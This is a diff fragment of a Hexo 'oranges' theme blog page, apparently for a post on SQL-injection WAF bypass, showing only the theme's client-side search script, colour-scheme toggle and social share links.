+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + SQL%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E5%AD%97%E7%AC%A6WAF%E7%BB%95%E8%BF%87 + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F24561%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/24561/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
